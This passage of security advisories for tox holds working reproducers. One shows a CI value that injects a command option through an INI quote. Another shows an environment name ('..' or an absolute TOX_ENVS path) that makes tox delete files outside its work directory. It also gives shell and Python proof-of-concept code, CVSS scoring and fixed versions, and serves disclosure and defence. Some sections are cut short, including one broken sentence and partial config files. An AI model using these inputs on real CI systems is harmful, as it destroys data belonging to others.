# check: "--title={env:PR_TITLE}" is one quoted argument, so the option must not arrive on its own
controls_hold = ini_plain == ["--title=" + plain_title] and toml_crafted == ["--title=" + crafted_title]
print("BUG" if controls_hold and "--injected-option" in ini_crafted else "OK")
```


## Impact

A substituted CI value closes an INI quote and adds a command option. The reproduction does not establish a wider
effect. Exposure is niche because the attack needs one outside-controlled value inserted into a quoted command argument.

For scoring, the conditional path is a trusted CI job forwarding outside-supplied data into this setting without
granting its source access to the tox host. The reproducer does not establish that such a job is deployed.

Severity: CVSS v4.0 base 2.0 (`CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N`). Metric reasons:

- `AV:L`: The reproducer runs tox on the host with the triggering value or path; it shows no network route into tox.
- `AC:L`: The reproducer requires no target-specific secret or evasion technique.
- `AT:P`: A trusted INI command must place an outside-controlled value inside a quoted argument.
- `PR:N`: The conditional outside source needs no prior privilege on the tox host.
- `UI:P`: A trusted user or job must run tox with the supplied input.
- `VC:N`: No disclosure appears in the reproduction.
- `VI:L`: The supplied value adds one option to a configured command.
- `VA:N`: No loss of availability appears in the reproduction.
- `SC:N`: No other system disclosed data in the test.
- `SI:N`: The reproduction does not establish an integrity impact on a subsequent system.
- `SA:N`: The test shows no outage in another system.

## Versions tested

The reproducer confirms 4.67.4, report commit `7988418936b730b19981ba934dc8b57186d6b957`, and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`. At
[fix commit `701e8b31141cd2f0d8ef98c72e04a03ce4b512e5`](https://github.com/gaborbernat/tox/commit/701e8b31141cd2f0d8ef98c72e04a03ce4b512e5),
the same reproducer returned `OK` in an isolated container without network access: the crafted INI value reached the
stand-in tool as one argument. The fix merged in [public PR #4283](https://github.com/tox-dev/tox/pull/4283) on
2026-10-30.

[tox 4.67.5](https://github.com/tox-dev/tox/releases/tag/4.67.5) includes the fix.

The tested affected versions are listed below. tox 1.0, 2.0.0, 3.0.0, all 16 published tox 4.0 prereleases, and every
stable tox 4.x release from 4.0.0 through 4.67.4 were confirmed by executing the configured command. Other checked 1.x
through 3.x versions were confirmed by their parsed command arguments. tox 0.9, 1.7.0, 1.7.1, and 4.67.5 kept the
crafted title in one argument. The affected-version entries are `>= 1.0, < 1.7.0` (patched in 1.7.0) and
`>= 1.7.2, < 4.67.5` (patched in 4.67.5). Separate entries preserve the unaffected 1.7.0 and 1.7.1 gap.

## Known mitigation

Use a TOML argument array or reject quote characters in the supplied value.

summary: Environment name removes files outside the work directory
description:
## Summary

Environment name removes files outside the work directory. Anthropic OSS Scanner reported this as ANT-2026-NXLEM0Q7 on
2026-10-22.

## Affected area

Environment selection and recreation.

## Attacker-controlled input

An environment name supplied to a trusted job. The attacker does not need to edit the trusted tox configuration.

## Affected code

[`ToxEnv.register_config()` in `src/tox/tox_env/api.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/tox_env/api.py#L124)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

The name becomes a path outside work_dir. Recreation clears that path before creating the environment.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48` during triage.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
BUG
```

### Historical release reproduction

These checks use Python 3.11 and pinned tox releases. The alpha accepts an absolute `TOX_ENVS` value; the stable
releases use `..` to select the project root. The commands create all files under a temporary directory.

```sh
base=$(mktemp -d)
mkdir -p "$base/4.0.0a2/project" "$base/4.0.0a2/outside"
cat > "$base/4.0.0a2/project/tox.ini" <<'INI'
[tox]
env_list = {env:TOX_ENVS:py}
[testenv]
package = skip
commands = python -c "print(1)"
INI
printf keep > "$base/4.0.0a2/outside/keep.txt"
status=0
(cd "$base/4.0.0a2/project" && TOX_ENVS="$base/4.0.0a2/outside" \
    uvx --python 3.11 --from tox==4.0.0a2 tox4 run -r) \
    > "$base/4.0.0a2.log" 2>&1 || status=$?
if [ -e "$base/4.0.0a2/outside/keep.txt" ]; then sentinel=present; else sentinel=removed; fi
if [ -e "$base/4.0.0a2/outside/pyvenv.cfg" ]; then venv=present; else venv=absent; fi
printf '4.0.0a2: exit=%s sentinel=%s outside_venv=%s\n' "$status" "$sentinel" "$venv"

for version in 4.0.0 4.67.4 4.67.5; do
    project="$base/$version/project"
    mkdir -p "$project/log"
    cat > "$project/tox.ini" <<'INI'
[tox]
env_list = {env:TOX_ENVS:py}
[testenv]
package = skip
commands = python -c "print(1)"
INI
    printf keep > "$project/log/keep.txt"
    status=0
    (cd "$project" && TOX_ENVS=.. uvx --python 3.11 \
        --from "tox==$version" tox run -r) \
        > "$base/$version.log" 2>&1 || status=$?
    if [ -e "$project/log/keep.txt" ]; then sentinel=present; else sentinel=removed; fi
    if [ -e "$project/pyvenv.cfg" ]; then venv=present; else venv=absent; fi
    printf '%s: exit=%s sentinel=%s root_venv=%s\n' "$version" "$status" "$sentinel" "$venv"
done
printf 'Logs: %s\n' "$base"
```

Observed status lines:

```text
4.0.0a2: exit=0 sentinel=removed outside_venv=present
4.0.0: exit=0 sentinel=removed root_venv=present
4.67.4: exit=0 sentinel=removed root_venv=present
4.67.5: exit=254 sentinel=present root_venv=absent
```

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Input author
    participant J as Trusted run
    participant T as tox
    participant S as Environment storage
    A->>J: provide an environment name containing path traversal
    J->>+T: run with the stated input
    T->>S: resolve the name outside work_dir
    Note over T,S: recreation clears the selected path
    deactivate T
```

## Reproducer files

The `repro` and `repro.d` files below are from the reporter's finding directory. The test image contains the 4.67.4
source at `/src` and the project installed in `/opt/venv`.

**repro**

```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import tempfile
from pathlib import Path

TOX = "/opt/venv/bin/tox"
base = Path(tempfile.mkdtemp(prefix="tox-envname-"))

# set up: the maintainer's tox.toml project, and a directory beside it that belongs to someone else
toml_project = base / "toml-project"
toml_project.mkdir()
shutil.copy("/tmp/repro.d/tox.toml", toml_project)
unrelated = base / "unrelated"
(unrelated / "sub").mkdir(parents=True)
(unrelated / "README").write_text("not tox's\n")
(unrelated / "sub" / "data").write_text("not tox's\n")
print("unrelated/ before:", sorted(os.listdir(unrelated)))

# attack 1: CI hands TOX_ENVS an absolute path; the user runs an ordinary `tox run -r`
toml_run = subprocess.run(
    [TOX, "run", "-r"],
    cwd=toml_project,
    env={**os.environ, "TOX_ENVS": str(unrelated)},
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True,
)
print(toml_run.stdout)
print("unrelated/ after: ", sorted(os.listdir(unrelated)))

# set up: the same project as tox.ini, with a log/ directory of its own
ini_project = base / "ini-project"
(ini_project / "log").mkdir(parents=True)
shutil.copy("/tmp/repro.d/tox.ini", ini_project)
(ini_project / "log" / "keep.txt").write_text("the project's, not tox's\n")

# attack 2: INI refuses "/" in a name but accepts "..", and <root>/.tox/.. is the project root; plain `tox run`, no -r
ini_run = subprocess.run(
    [TOX, "run"],
    cwd=ini_project,
    env={**os.environ, "TOX_ENVS": ".."},
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True,
)
print(ini_run.stdout)
print("ini-project/ after:", sorted(os.listdir(ini_project)))
print("ini-project/log/ after:", sorted(os.listdir(ini_project / "log")))

# check: every env directory should be under <project>/.tox; here tox emptied and took over directories outside it
unrelated_emptied = not (unrelated / "README").exists() and not (unrelated / "sub").exists()
venv_in_unrelated = (unrelated / "pyvenv.cfg").exists()
project_log_emptied = not (ini_project / "log" / "keep.txt").exists()
venv_in_project_root = (ini_project / "pyvenv.cfg").exists()
print(
    f"TOML, TOX_ENVS={unrelated}, tox run -r: contents deleted={unrelated_emptied}, virtualenv created={venv_in_unrelated}"
)
print(
    f"INI,  TOX_ENVS=.., tox run: log/keep.txt deleted={project_log_emptied}, virtualenv in project root={venv_in_project_root}"
)
print("BUG" if unrelated_emptied and venv_in_unrelated and project_log_emptied and venv_in_project_root else "OK")
```

```ini

[testenv]
package = skip
commands = python -c 'print("tests ran")'
```

```toml

no_package = true
```

- `AC:L`: The reproducer requires no target-specific secret or evasion technique.
- `AT:P`: A trusted job must accept an outside-controlled environment name and recreate the selected environment.
- `PR:N`: The conditional outside source needs no prior privilege on the tox host.
- `UI:P`: A trusted user or job must run tox with the supplied input.
- `VC:N`: No disclosure appears in the reproduction.
- `VI:H`: The test removes files outside the tox work directory.
- `VA:L`: The test removes a limited set of files and does not show full denial.
- `SC:N`: No other system disclosed data in the test.
- `SI:N`: The reproduction does not establish an integrity impact on a subsequent system.
- `SA:N`: The test shows no outage in another system.

The reproducer confirms 4.67.4, report commit `7988418936b730b19981ba934dc8b57186d6b957`, and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`. The same isolated reproducer returned `OK` with

[tox 4.67.5](https://github.com/tox-dev/tox/releases/tag/4.67.5) includes the fix.

Historical tests reproduced the environment-path escape in all 210 published tox 4 releases from 4.0.0a2 through 4.67.4.
Early prereleases used an absolute `TOX_ENVS` path; stable releases used `TOX_ENVS=..`. tox 3.28.0 rejected `-e ..`, and
tox 4.67.5 rejected the escaping selection without deleting the sentinel.
[Commit `741362fb`](https://github.com/tox-dev/tox/commit/741362fb523f48d0fd826006bc6251a85c3ec5f4) introduced the
vulnerable environment-directory cleanup.
